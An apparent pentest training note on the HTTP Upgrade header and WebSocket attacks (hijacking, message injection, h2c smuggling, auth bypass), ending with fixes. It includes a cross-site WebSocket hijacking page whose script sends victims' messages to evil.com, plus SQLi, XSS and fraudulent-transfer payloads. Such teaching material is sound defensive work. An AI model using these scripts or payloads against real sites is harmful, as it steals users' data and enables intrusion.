---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.28 Upgrade — WebSocket Hijacking"
---

# 03.28 — Upgrade

## What is it?

The `Upgrade` request header asks the server to switch to a different protocol on the same TCP connection. The most common use is upgrading HTTP/1.1 to WebSocket. Attackers can exploit this to bypass security checks, hijack WebSocket connections, or smuggle requests through upgraded connections.

---

## WebSocket Upgrade Handshake

```
CLIENT REQUEST:
  GET /chat HTTP/1.1
  Host: target.com
  Upgrade: websocket
  Connection: Upgrade
  Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==   ← random base64
  Sec-WebSocket-Version: 13

SERVER RESPONSE:
  HTTP/1.1 101 Switching Protocols
  Upgrade: websocket
  Connection: Upgrade
  Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=  ← derived from key

  [Connection is now WebSocket — bidirectional binary frames]
```

---

## Attack 1: Cross-Site WebSocket Hijacking (CSWSH)

```
SCENARIO: WebSocket endpoint relies only on cookies for auth.
          No CSRF token or Origin check.

ATTACK:
  Attacker's page runs JavaScript:
  
  var ws = new WebSocket('wss://target.com/chat');
  ws.onopen = function() {
    ws.send('{"action":"get_messages"}');
  };
  ws.onmessage = function(event) {
    // send victim's data to attacker:
    fetch('https://evil.com/?data=' + encodeURIComponent(event.data));
  };
  
  WHY IT WORKS:
  - Browser auto-sends cookies with WebSocket upgrade request
  - If server doesn't check Origin → accepts connection!
  - Attacker reads victim's WebSocket messages!
```

**PortSwigger:** WebSocket security vulnerabilities (WebSocket labs)

---

## Attack 2: WebSocket Message Injection

```
Once connected to WebSocket, inject attack payloads via messages:

SQLi via WebSocket message:
  ws.send('{"user": "admin\' OR SLEEP(5)--"}')

XSS via WebSocket (if messages rendered):
  ws.send('{"msg": "<script>alert(1)</script>"}')

Business logic abuse:
  ws.send('{"action": "transfer", "amount": 99999, "to": "attacker"}')
```

---

## Attack 3: h2c Upgrade Smuggling

```
HTTP/2 cleartext (h2c) upgrade via HTTP/1.1:

GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: <base64-encoded settings>
Connection: Upgrade, HTTP2-Settings

IF the proxy allows this upgrade:
  Connection becomes HTTP/2
  Attacker can send multiple streams
  → Smuggling potential (different parsers for H1/H2)!
```

---

## Attack 4: Bypass Auth via WebSocket Upgrade

```
SCENARIO: REST API enforces authentication.
          WebSocket endpoint /ws shares same code but checks auth differently.

TEST:
  Normal: GET /api/admin → 403
  WebSocket: Upgrade to wss://target.com/ws → check messages
             → might have less restrictive auth!

WebSocket connections often skip:
  - Rate limiting (applied per request, not per connection)
  - WAF signature matching (binary framing)
  - CSRF tokens (cookies auto-sent)
```

---

## Testing

```bash
# Test WebSocket connection with wscat
wscat -c wss://target.com/ws
> {"action":"getBalance"}
< {"balance":1000}

# Test CSWSH:
# Create HTML page, host it, trick victim to visit:
cat > cswsh.html << 'EOF'
<html><body>
<script>
var ws = new WebSocket('wss://TARGET/ws');
ws.onmessage = function(e){
  fetch('https://evil.com/?d='+encodeURIComponent(e.data));
};
</script>
</body></html>
EOF

# Check if Origin is validated:
curl -H "Upgrade: websocket" \
     -H "Connection: Upgrade" \
     -H "Sec-WebSocket-Key: $(echo -n "test" | base64)" \
     -H "Sec-WebSocket-Version: 13" \
     -H "Origin: https://evil.com" \
     https://target.com/ws -v
# 101 = no Origin check → CSWSH possible!
# 403 = Origin validation present
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| No Origin check → CSWSH | Validate Origin header on WebSocket upgrade |
| WebSocket message injection | Sanitize all WebSocket message content |
| Weaker auth on WebSocket | Apply same auth checks as REST API |
| h2c upgrade abuse | Disable h2c if not needed; use HTTP/2 with TLS only |

---

## Related Notes
- [[29 - Connection]] — Connection: Upgrade required for WS
- [[02.22 - WebSockets Upgrade Handshake]] — full WebSocket guide
- [[Module 12 - WebSocket Attacks]] — WebSocket exploitation
